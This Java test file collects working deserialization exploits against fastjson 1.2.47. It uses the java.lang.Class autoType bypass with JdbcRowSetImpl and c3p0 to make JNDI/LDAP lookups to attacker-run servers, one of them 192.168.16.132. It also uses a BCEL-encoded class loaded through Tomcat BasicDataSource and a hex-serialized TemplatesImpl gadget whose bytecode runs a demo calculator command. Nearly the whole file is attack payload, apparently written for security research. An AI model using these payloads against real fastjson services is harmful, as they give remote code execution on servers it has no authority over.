import com.alibaba.fastjson.JSON;
import org.junit.Test;

/**
 * @author Whoopsunix
 */
public class fastjson_1_2_47 {
    @Test
    public void demo() throws Exception {
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String v1_2_47 = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://192.168.16.132:1389/siflky\",\"autoCommit\":true}}";
        Object parse = JSON.parse(v1_2_47);
    }

    @Test
    public void bcel_dhcp() throws Exception {
        String bcelStr = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQMo$da$40$Q$7d$L$G$83c$S$3eB$93$s$fd$e2T$c8$n$be$e4$G$adT$nz$89$vQ$5c$a5$e7e$bb$a2$9b$g$db$b2$97$u$fdE$3dsI$ab$i$fa$D$fa$a3$aa$cen$p$82$d4$3d$cch$de$9b$f7fv$f7$f7$9f$fb_$A$ce$d0$f3$e0b$dfC$XOj80$f9$d0$c5S$XG$$$8e$Z$aa$p$95$u$fd$96$a1$dc$l$5c18$e3$f4$b3d$d8$LU$o$3f$ac$96s$99$7f$e4$f3$98$90v$98$K$k_$f1$5c$99$fa$Bt$f4$XU$90G8$b9$95b$c8P$h$89$f8$c1$ae$Ri$$$beNyf$5bi$m$83$X$a5$ab$5c$c8$f7$caH$ebFrz$cdo$b8$8f$g$ea$$$9e$f9x$8e$X$Mo$82$e8$5b$a1$e52x$97e$b1$S$5c$ab4$v$821$8f$c5$w$e6$3a$cdOy$96$F$e34$d12$d1E0$e5b$Wm$b1$3e$5e$e2$VC$c7$Y$H1O$W$c1$e4V$c8$cc$98$d0$baf$sC$f3$91$9c$cd$af$a5$d0$M$adG$e8r$95h$b5$a4$N$bd$85$d4$9b$a2$db$l$84$ff$f5$d0$8d$ji$z_$f7$b7$d8H$e7$wY$M$b7$F$Xy$wdQ$M$d1C$95$7e$c3$9c$S$98$b98E$8f$aa$802$a3$5c9$f9$B$b6$b6$f4$O$c5$aa$F$j$f8$U$fd$7f$Nh$60$97r$N$7b$h$f1$cc$9a$B$bb$3fQj$97$ef$e0$7c$fa$O$e7$7cm$b1$3a$e9$w$u$5b$b769$81$c6$d7Ie$5e$bdA$a8og$BM$cb$94B$X$z$90$b0m$e1$ce_5l$abWE$C$A$A";
        String payload = "{\n" +
                "    \"name\":\n" +
                "    {\n" +
                "        \"@type\" : \"java.lang.Class\",\n" +
                "        \"val\"   : \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\"\n" +
                "    },\n" +
                "    \"x\" : {\n" +
                "        \"name\": {\n" +
                "            \"@type\" : \"java.lang.Class\",\n" +
                "            \"val\"   : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "        },\n" +
                "        \"y\": {\n" +
                "            \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                "            \"c\": {\n" +
                "                \"@type\":\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\":\"" + bcelStr + "\",\n" +
                "\n" +
                "                     \"$ref\": \"$.x.y.c.connection\"\n" +
                "            }\n" +
                "        }\n" +
                "    }\n" +
                "}";

        System.out.println(payload);

        JSON.parseObject(payload);
    }

    @Test
    public void c3p0_jndi() throws Exception {
        // open -a Calculator.app
        String payload = "{\n" +
                "  \"a\":{\n" +
                "    \"@type\":\"java.lang.Class\",\n" +
                "    \"val\":\"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\"\n" +
                "  },\n" +
                "  \"b\":{\n" +
                "    \"@type\":\"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\",\n" +
                "    \"JndiName\":\"ldap://127.0.0.1:1389/kobnqy\",\n" +
                "    \"LoginTimeout\":0\n" +
                "  }\n" +
                "}";

        System.out.println(payload);

        JSON.parseObject(payload);
    }

    @Test
    public void c3p0_hex() throws Exception {
        // open -a Calculator.app
        String payload = "{\n" +
                "    \"a\": {\n" +
                "        \"@type\": \"java.lang.Class\",\n" +
                "        \"val\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"\n" +
                "    },\n" +
                "    \"b\": {\n" +
                "        \"@type\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\n" +
                "        \"userOverridesAsString\": \"HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C770800000010000000017372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C6173737400125B4C6A6176612F6C616E672F436C6173733B4C00055F6E616D657400124C6A6176612F6C616E672F537472696E673B4C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B78700000000000000000757200035B5B424BFD19156767DB37020000787000000002757200025B42ACF317F8060854E00200007870000006ACCAFEBABE0000003400390A0003002207003707002507002601001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C756505AD2093F391DDEF3E0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010013537475625472616E736C65745061796C6F616401000C496E6E6572436C61737365730100354C79737073657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F61643B0100097472616E73666F726D010072284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B5B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B2956010008646F63756D656E7401002D4C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B01000868616E646C6572730100425B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A457863657074696F6E730700270100A6284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B29560100086974657261746F720100354C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B01000768616E646C65720100414C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07002801003379737073657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F6164010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740100146A6176612F696F2F53657269616C697A61626C65010039636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F5472616E736C6574457863657074696F6E01001F79737073657269616C2F7061796C6F6164732F7574696C2F476164676574730100083C636C696E69743E0100116A6176612F6C616E672F52756E74696D6507002A01000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B0C002C002D0A002B002E0100166F70656E202D612043616C63756C61746F722E61707008003001000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0C003200330A002B003401000D537461636B4D61705461626C6501001E79736F73657269616C2F50776E65723435393139333330333334313435380100204C79736F73657269616C2F50776E65723435393139333330333334313435383B002100020003000100040001001A000500060001000700000002000800040001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000002B000E0000000C000100000005000F003800000001001300140002000C0000003F0000000300000001B100000002000D00000006000100000031000E00000020000300000001000F0038000000000001001500160001000000010017001800020019000000040001001A00010013001B0002000C000000490000000400000001B100000002000D00000006000100000036000E0000002A000400000001000F003800000000000100150016000100000001001C001D000200000001001E001F00030019000000040001001A00080029000B0001000C00000024000300020000000FA70003014CB8002F1231B6003557B1000000010036000000030001030002002000000002002100110000000A000100020023001000097571007E000A000001D4CAFEBABE00000034001B0A0003001507001707001807001901001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C75650571E669EE3C6D47180100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C650100047468697301000350505001000C496E6E6572436C61737365730100254C79737073657269616C2F7061796C6F6164732F7574696C2F47616467657473245050503B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07001A01002379737073657269616C2F7061796C6F6164732F7574696C2F47616467657473245050500100106A6176612F6C616E672F4F626A6563740100146A6176612F696F2F53657269616C697A61626C6501001F79737073657269616C2F7061796C6F6164732F7574696C2F47616467657473002100020003000100040001001A000500060001000700000002000800010001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000003A000E0000000C000100000005000F001200000002001300000002001400110000000A0001000200160010000970740006616E7953747270770100787372002E6A617661782E6D616E6167656D656E742E42616441747472696275746556616C7565457870457863657074696F6ED4E7DAAB632D46400200014C000376616C7400124C6A6176612F6C616E672F4F626A6563743B787200136A6176612E6C616E672E457863657074696F6ED0FD1F3E1A3B1CC4020000787200136A6176612E6C616E672E5468726F7761626C65D5C635273977B8CB0300044C000563617573657400154C6A6176612F6C616E672F5468726F7761626C653B4C000D64657461696C4D65737361676571007E00055B000A737461636B547261636574001E5B4C6A6176612F6C616E672F537461636B5472616365456C656D656E743B4C001473757070726573736564457863657074696F6E737400104C6A6176612F7574696C2F4C6973743B787071007E0015707572001E5B4C6A6176612E6C616E672E537461636B5472616365456C656D656E743B02462A3C3CFD22390200007870000000037372001B6A6176612E6C616E672E537461636B5472616365456C656D656E746109C59A2636DD8502000449000A6C696E654E756D6265724C000E6465636C6172696E67436C61737371007E00054C000866696C654E616D6571007E00054C000A6D6574686F644E616D6571007E000578700000002474002379737073657269616C2E7061796C6F6164732E676164676574732E466173744A736F6E74000D466173744A736F6E2E6A6176617400096765744F626A6563747371007E00180000001A71007E001A71007E001B71007E001C7371007E00180000002F71007E001A71007E001B7400046D61696E737200266A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C654C697374FC0F2531B5EC8E100200014C00046C69737471007E00147872002C6A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C65436F6C6C656374696F6E19420080CB5EF71E0200014C0001637400164C6A6176612F7574696C2F436F6C6C656374696F6E3B7870737200136A6176612E7574696C2E41727261794C6973747881D21D99C7619D03000149000473697A657870000000007704000000007871007E0025787372001E636F6D2E616C69626162612E666173746A736F6E2E4A534F4E417272617900000000000000010200014C00046C69737471007E001478707371007E00240000000177040000000171007E00077878;\"\n" +
                "    }\n" +
                "}";

        System.out.println(payload);

        JSON.parseObject(payload);
    }
}
